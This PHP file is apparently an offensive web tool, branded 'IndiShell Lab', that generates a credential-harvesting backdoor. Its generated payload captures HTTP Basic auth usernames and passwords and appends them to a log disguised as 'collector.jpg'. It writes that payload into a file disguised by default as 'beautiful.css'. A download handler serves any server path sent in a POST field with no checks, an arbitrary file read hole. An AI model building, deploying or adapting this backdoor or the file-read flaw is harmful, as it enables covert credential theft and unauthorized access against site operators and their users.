<?php

function file_download($download)
{
	if(file_exists($download))
				{
					header("Content-Description: File Transfer"); 
					
					header('Content-Transfer-Encoding: binary');
					header('Expires: 0');
					header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
					header('Pragma: public');
					header('Accept-Ranges: bytes');
					header('Content-Disposition: attachment; filename="'.basename($download).'"'); 
					header('Content-Length: ' . filesize($download));
					header('Content-Type: application/octet-stream'); 
					ob_clean();
					flush();
					readfile ($download);
				}
				
	
}

if(isset($_POST['download']))
{


				$file=trim($_POST['file']);
			file_download($file);

			
        }



$head = '
<html>
<head>
<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLfLXmLeMSTt0jOXREfgvdp8IYWnE9_t49PpAiJNvwHTqnKkL4" rel="icon" type="image/x-icon"/>
</script>
<title>--==[[IndiShell Lab]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<STYLE>
body {
	background: url(images/white_beard.png);
	background-size: 100% 600px;
	background-position: center center;
	background-attachment: fixed;
    background-repeat: no-repeat;
	background-color: #000000;
	font-family: Tahoma;
	color: white;

}
.side-pan {
   margin: 0;
   border:0px;
   margin:0px;
   -webkit-border-radius: 0px;
   -moz-border-radius: 0px;
   border-radius: 0px;
   border-bottom: 1px solid black;
   color: black;
   font-size: 20px;
   font-family: Georgia, serif;
   text-decoration: none;
   vertical-align: left;
   align:left;
   }
   div#left {
    width: 100%;
    height: 50px;
    float: left;
	}
div#right {
    margin-left: 20%;
    height: 50px;
	color: white;
    font-size: 20px;
    font-family: Georgia, serif;
	}
.main div {
  float: left;
  clear: none; 
	}

input {
border			: solid 2px ;
border-color		: black;
BACKGROUND-COLOR: #F5F5F5;
font: 12pt Verdana;
height: 20pt;
color: black;
margin: 0px 0px 5px;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: black;
}

tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 0px ;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 2px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: #191919;;
color: #FFF;
}
textarea {
border			: dashed 2px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}


.download {
   margin: 0;
   border:0px;
   background:#C0C0C0;
   width:210px;
   height:30px;
   
   margin:0px;
   -webkit-border-radius: 0px;
   -moz-border-radius: 0px;
   border-radius: 6px;
   border-bottom: 1px solid black;
   color: #28597a;
   font-size: 20px;
   font-family: Georgia, serif;
   text-decoration: none;
   vertical-align: left;
   align:left;
   }

</STYLE>

'; 

echo $head ;

echo '
<table width="100%" cellspacing="0" cellpadding="0" class="tb1" style="border:0px;" >
			
       <td width="100%" align=center valign="top" rowspan="1">
	   <font color=#ff9933 size="-2"> 
        ##########################################</font><font color=white size="-2">#############################################</font><font color=green size="-2">#############################################</font><br>
           <font color=white size=5 >--==[[ LDAP credentials collector backdoor generator ]]==--<br>--==[[ By IndiShell Lab]]==--</font>
		   <div class="hedr"> 
        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="100%" align="center" valign="top" rowspan="1">
		<font color=#ff9933 size="-2"> 
        ##########################################</font><font color=white size="-2">#############################################</font><font color=green size="-2">#############################################</font><br>
		<font 
        color="red" face="comic sans ms"size="1">
        
						
          
       </table> 
'; 

echo '<div  align=center style="margin:40px 0px">
		<form method=post>
		
				<input type=submit name=stage1 value="Start Process" class="side-pan">
		
				</form>';

				
if(isset($_POST['stage1']))
{
	
	
	echo '<table width="100%" cellspacing="0" cellpadding="0"  style="border:0px; background-color: transparent;" >
			<form method=post >
		        <tr>
					<td width="50%" align=right valign="top" rowspan="1" style="border:0px; ">
					Backdoor file name: -</td>
					<td width="50%" align=left valign="top" rowspan="1">
					<input type=text name=file value="beautiful.css" ><br></td></tr>
				<tr>
					<td width="50%" align=right valign="top" rowspan="1" style="border:0px; ">
					Credentials collector file: - </td>
					<td width="50%" align=left valign="top" rowspan="1">
					<input type=text name=collector value="collector.jpg">
					</td></tr>
				</table>
				<br>
					<input type=submit name=stage2 value="create backdoor file" class="side-pan">
			</form>';
	
}

if(isset($_POST['stage2']))	
		{
			$backdoor=trim($_POST['file']);
			$collector=trim($_POST['collector']);
			$data='<?php 
					if(@$_SERVER[\'PHP_AUTH_USER\']!=\'\')
					{
							
							$credentials=\'Username:-#-\'.@$_SERVER[\'PHP_AUTH_USER\'].\'-#-Password:-#-\'.@$_SERVER[\'PHP_AUTH_PW\'];
							$handle = fopen("'.$collector.'", "r");
							$found = false;
							while (($buffer = fgets($handle)) !== false) 
							{
								
								if (strpos($buffer, $credentials) !== false) 
								{
									$data=explode(\'-#-\',$buffer);
									if($data[1]==@$_SERVER[\'PHP_AUTH_USER\'] && trim($data[3])==@$_SERVER[\'PHP_AUTH_PW\'])
									{
										$found = true;
										break;
									}
								}      
							}
							fclose($handle);
							
							if($found!=true)
							{
								
								$credentials_final=$credentials."\n";
								$file=@fopen("'.$collector.'","a+");
								@fwrite($file,$credentials_final);
							}
					}
					?>';
			$back=fopen($backdoor,'a+');
			fwrite($back,$data);
					
			echo '<form method=post>
					<input type=hidden name=file value="'.$backdoor.'">
					<input type=submit name=download value="Download Backdoor" class=download></form>
					';		
			
		}				
?>